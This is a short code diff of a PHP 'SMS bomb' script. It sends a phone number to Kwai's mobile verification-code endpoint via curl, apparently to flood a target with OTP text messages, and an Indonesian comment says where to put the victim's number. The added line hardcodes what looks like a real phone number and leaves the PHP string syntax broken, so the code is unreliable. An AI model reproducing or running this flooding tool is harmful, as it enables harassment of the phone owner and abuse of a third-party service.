@@ -3,7 +3,7 @@
 //Bomb SMS KWAI :v
 error_reporting(0);
 $no = $_GET['no'];
-    $body = '{"mobile":' . $no . ',"countryCode":"+62","bizType":38}';  //No hp lu kasi setelah "mobile": ( 82xxxxxxxxx ) tanpa 62
+    $body = '{"mobile":895365875516 . $no . ',"countryCode":"+62","bizType":38}';  //No hp lu kasi setelah "mobile": ( 82xxxxxxxxx ) tanpa 62
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, "https://m.kwai.com/o/nodeapi/oversea/rest/o/p/mobile/sendMobileCode");
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
